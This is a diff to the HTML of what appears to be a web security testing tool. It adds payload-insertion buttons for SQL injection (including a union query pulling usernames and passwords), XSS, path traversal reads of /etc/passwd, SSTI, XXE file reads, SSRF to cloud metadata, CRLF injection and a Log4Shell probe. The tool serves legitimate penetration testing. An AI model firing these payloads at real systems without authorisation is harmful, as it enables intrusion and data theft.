@@ -35,35 +35,105 @@
         <details class="menu">
           <summary>SQL</summary>
           <div class="menu-popover">
+            <span class="menu-section">Basics</span>
             <button type="button" data-insert="'">Quote</button>
             <button type="button" data-insert="' OR '1'='1">Boolean test</button>
+            <button type="button" data-insert="' AND '1'='2">Boolean false</button>
+            <button type="button" data-insert="admin'-- ">Login bypass</button>
+            <span class="menu-section">Union</span>
             <button type="button" data-insert="' UNION SELECT NULL-- ">Union select</button>
+            <button type="button" data-insert="' UNION SELECT NULL,NULL-- ">Union 2 columns</button>
+            <button type="button" data-insert="' UNION SELECT NULL,NULL,NULL-- ">Union 3 columns</button>
+            <button type="button" data-insert="' UNION SELECT username,password FROM users-- ">Union users</button>
             <button type="button" data-insert="' ORDER BY 1-- ">Order by</button>
+            <button type="button" data-insert="' GROUP BY 1-- ">Group by</button>
+            <span class="menu-section">Comments</span>
             <button type="button" data-insert="-- ">Comment dash</button>
             <button type="button" data-insert="/* */">Comment block</button>
+            <button type="button" data-insert="#">Comment hash</button>
+            <button type="button" data-insert="--+">Comment plus</button>
+            <span class="menu-section">Database</span>
+            <button type="button" data-insert="' AND @@version-- ">MySQL version</button>
+            <button type="button" data-insert="' AND version() IS NOT NULL-- ">Postgres version</button>
+            <button type="button" data-insert="' AND @@SERVERNAME IS NOT NULL-- ">MSSQL server</button>
+            <button type="button" data-insert="' AND banner IS NOT NULL FROM v$version-- ">Oracle banner</button>
+            <span class="menu-section">Error based</span>
+            <button type="button" data-insert="' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ">Error extractvalue</button>
+            <button type="button" data-insert="' AND updatexml(1,concat(0x7e,database(),0x7e),1)-- ">Error updatexml</button>
+            <button type="button" data-insert="' AND CAST((SELECT version()) AS int)-- ">Error cast</button>
+            <span class="menu-section">Time based</span>
             <button type="button" data-insert="' AND SLEEP(5)-- ">Time delay</button>
+            <button type="button" data-insert="' AND pg_sleep(5)-- ">Postgres delay</button>
+            <button type="button" data-insert="WAITFOR DELAY '0:0:5'-- ">MSSQL delay</button>
+            <button type="button" data-insert="' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5) IS NULL-- ">Oracle delay</button>
+            <span class="menu-section">Stacked</span>
+            <button type="button" data-insert="'; SELECT 1-- ">Stacked query</button>
+            <button type="button" data-insert="'; WAITFOR DELAY '0:0:5'-- ">Stacked delay</button>
           </div>
         </details>
         <details class="menu">
           <summary>XSS</summary>
           <div class="menu-popover">
+            <span class="menu-section">HTML</span>
             <button type="button" data-insert="<script>alert(1)</script>">Alert</button>
+            <button type="button" data-insert="&lt;script&gt;alert(1)&lt;/script&gt;">HTML entity script</button>
             <button type="button" data-insert="&quot;><img src=x onerror=alert(1)>">Image error</button>
             <button type="button" data-insert="<svg onload=alert(1)>">SVG onload</button>
+            <button type="button" data-insert="<body onload=alert(1)>">Body onload</button>
+            <button type="button" data-insert="<details open ontoggle=alert(1)>">Details ontoggle</button>
+            <button type="button" data-insert="<iframe srcdoc=&quot;<script>alert(1)</script>&quot;>">Iframe srcdoc</button>
+            <span class="menu-section">Attribute</span>
             <button type="button" data-insert="&quot; autofocus onfocus=alert(1) x=&quot;">Attribute break</button>
+            <button type="button" data-insert="' onmouseover=alert(1) x='">Single quote attr</button>
+            <button type="button" data-insert=" onmouseover=alert(1) ">Unquoted attr</button>
+            <button type="button" data-insert="&quot;><input autofocus onfocus=alert(1)>">Input autofocus</button>
+            <span class="menu-section">URL / SVG</span>
             <button type="button" data-insert="javascript:alert(1)">JavaScript URL</button>
+            <button type="button" data-insert="<a href=javascript:alert(1)>x</a>">Anchor JS URL</button>
+            <button type="button" data-insert="<math><mi xlink:href=&quot;javascript:alert(1)&quot;>x</mi></math>">MathML href</button>
+            <span class="menu-section">Context break</span>
+            <button type="button" data-insert="</textarea><script>alert(1)</script>">Textarea break</button>
+            <button type="button" data-insert="</title><script>alert(1)</script>">Title break</button>
+            <button type="button" data-insert="';alert(1);//">JS string single</button>
+            <button type="button" data-insert="&quot;;alert(1);//">JS string double</button>
+            <button type="button" data-insert="{{constructor.constructor('alert(1)')()}}">Template breakout</button>
           </div>
         </details>
         <details class="menu">
           <summary>Other</summary>
           <div class="menu-popover">
+            <span class="menu-section">Traversal / LFI</span>
             <button type="button" data-insert="../">Path segment</button>
-            <button type="button" data-insert="{{7*7}}">Template test</button>
             <button type="button" data-insert="../../../../etc/passwd">LFI passwd</button>
+            <button type="button" data-insert="..%2f..%2f..%2f..%2fetc%2fpasswd">Encoded traversal</button>
+            <button type="button" data-insert="....//....//....//etc/passwd">Double dot slash</button>
             <button type="button" data-insert="C:\Windows\win.ini">LFI win.ini</button>
+            <button type="button" data-insert="file:///etc/passwd">File URI passwd</button>
+            <span class="menu-section">SSTI</span>
+            <button type="button" data-insert="{{7*7}}">Template test</button>
             <button type="button" data-insert="${7*7}">SSTI dollar</button>
             <button type="button" data-insert="<%= 7*7 %>">SSTI ERB</button>
+            <button type="button" data-insert="${{7*7}}">SSTI Freemarker</button>
+            <button type="button" data-insert="#set($x=7*7)${x}">SSTI Velocity</button>
+            <button type="button" data-insert="{{config}}">SSTI config</button>
+            <button type="button" data-insert="{{self}}">SSTI self</button>
+            <span class="menu-section">XXE</span>
             <button type="button" data-insert="<!DOCTYPE xxe [<!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;>]><root>&amp;xxe;</root>">XXE basic</button>
+            <button type="button" data-insert="<!DOCTYPE xxe [<!ENTITY % xxe SYSTEM &quot;http://127.0.0.1/test.dtd&quot;>%xxe;]>">XXE parameter</button>
+            <button type="button" data-insert="<?xml version=&quot;1.0&quot;?><!DOCTYPE root [<!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot;>]><root>&amp;xxe;</root>">XXE Windows</button>
+            <span class="menu-section">SSRF</span>
+            <button type="button" data-insert="http://127.0.0.1/">SSRF localhost</button>
+            <button type="button" data-insert="http://169.254.169.254/latest/meta-data/">SSRF metadata</button>
+            <button type="button" data-insert="http://[::1]/">SSRF IPv6 localhost</button>
+            <button type="button" data-insert="http://2130706433/">SSRF decimal IP</button>
+            <span class="menu-section">Redirect / Headers</span>
+            <button type="button" data-insert="//example.com">Open redirect</button>
+            <button type="button" data-insert="https://example.com%2f..">Redirect encoded</button>
+            <button type="button" data-insert="%0d%0aX-Test: test">CRLF header</button>
+            <button type="button" data-insert="%0d%0aSet-Cookie: test=1">CRLF cookie</button>
+            <span class="menu-section">Probes</span>
+            <button type="button" data-insert="${jndi:ldap://127.0.0.1/a}">Log4Shell probe</button>
+            <button type="button" data-insert="{{_self.env.registerUndefinedFilterCallback('exec')}}">Twig callback</button>
           </div>
         </details>
         <span id="status" class="status" role="status">Ready</span>
